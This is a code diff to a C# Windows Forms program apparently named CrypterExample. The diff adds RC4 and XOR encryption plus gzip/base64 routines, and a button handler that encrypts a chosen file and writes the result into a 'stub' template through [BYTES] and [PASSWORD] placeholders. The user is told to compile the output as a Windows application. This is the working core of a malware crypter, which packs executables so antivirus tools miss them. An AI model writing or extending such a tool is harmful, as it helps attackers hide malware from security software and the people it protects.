@@ -11,6 +11,9 @@ using System.Diagnostics;
 using Ionic.Zip;
 using Crypter;
 using System.Drawing;
+using System.CodeDom.Compiler;
+using Microsoft.CSharp;
+using System.Collections.Generic;
 
 namespace CrypterExample
 {
@@ -553,6 +556,99 @@ namespace CrypterExample
 				MessageBox.Show("Please enter the url.",
 						"Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
 			}
+		}
+		static string ByteArrayToString(byte[] ba)
+		{
+			return BitConverter.ToString(ba).Replace("-", "");
+		}
+		static byte[] RC4(byte[] pwd, byte[] data)
+		{
+			int a, i, j, k, tmp;
+			int[] key, box;
+			byte[] cipher;
+
+			key = new int[256];
+			box = new int[256];
+			cipher = new byte[data.Length];
+
+			for (i = 0; i < 256; i++)
+			{
+				key[i] = pwd[i % pwd.Length];
+				box[i] = i;
+			}
+			for (j = i = 0; i < 256; i++)
+			{
+				j = (j + box[i] + key[i]) % 256;
+				tmp = box[i];
+				box[i] = box[j];
+				box[j] = tmp;
+			}
+			for (a = j = i = 0; i < data.Length; i++)
+			{
+				a++;
+				a %= 256;
+				j += box[a];
+				j %= 256;
+				tmp = box[a];
+				box[a] = box[j];
+				box[j] = tmp;
+				k = box[((box[a] + box[j]) % 256)];
+				cipher[i] = (byte)(data[i] ^ k);
+			}
+			return cipher;
+		}
+
+		static string XOR(string target)
+		{
+			string result = "";
+
+			for (int i = 0; i < target.Length; i++)
+			{
+				char ch = (char)(target[i] ^ 123);
+				result += ch;
+			}
+
+			//Console.WriteLine("XOR Encoded string: " + result);
+			return result;
+		}
+		public static string CompressString(string value)
+		{
+			byte[] byteArray = new byte[0];
+			if (!string.IsNullOrEmpty(value))
+			{
+				byteArray = Encoding.UTF8.GetBytes(value);
+				using (MemoryStream stream = new MemoryStream())
+				{
+					using (GZipStream zip = new GZipStream(stream, CompressionMode.Compress))
+					{
+						zip.Write(byteArray, 0, byteArray.Length);
+					}
+					byteArray = stream.ToArray();
+				}
+			}
+			return Convert.ToBase64String(byteArray);
+		}
+
+		private void button19_Click(object sender, EventArgs e)
+		{
+			if (textBox1.Text != "" && textBox3.Text != "")
+			{
+				string bytesString = ByteArrayToString(RC4(Encoding.Default.GetBytes(textBox3.Text), File.ReadAllBytes(textBox1.Text))); //Шифруем байты, конвертируем шифрованные байты файла в строку
+
+				string Source = Crypter.Properties.Resources.rc4_xor; // Переменная, в которой хранится код стаба
+				Source = Source.Replace("[BYTES]", CompressString(XOR(bytesString))); // Заменяем строку [BYTES], на заксоренную строку с шифрованными байтами
+				Source = Source.Replace("[PASSWORD]", CompressString(textBox3.Text)); // Заменяем пароль для RC4
+				textBox2.Text = Source;
+				MessageBox.Show("Copy to VS ; Use .NET Framework 4 ; Choose Windows Application.",
+						"Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
+			}
+			else
+			{
+				MessageBox.Show("Please select the file and enter the key.",
+						"Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
+			}
+
+			
 		}
 	}
 }
